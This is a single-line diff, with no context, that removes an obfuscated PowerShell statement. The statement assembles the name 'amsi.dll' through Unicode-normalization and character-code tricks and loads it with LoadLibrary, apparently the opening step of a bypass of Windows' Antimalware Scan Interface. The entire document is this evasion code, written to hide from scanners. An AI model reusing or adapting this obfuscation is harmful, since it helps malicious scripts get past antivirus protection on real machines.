@@ -1,1 +1,0 @@
-$vkriewz = [ctzhq]::LoadLibrary("$(('á'+'m'+'s'+'í'+'.'+'d'+'l'+'l').nORmaLize([ChAR](70)+[chAr]([ByTE]0x6f)+[CHaR](48+66)+[CHar]([byte]0x6d)+[CHaR](68+48-48)) -replace [CHAr]([bYte]0x5c)+[CHar]([byTE]0x70)+[CHaR]([BYtE]0x7b)+[ChAr](77)+[CHAr]([ByTE]0x6e)+[chaR]([bYTe]0x7d))")
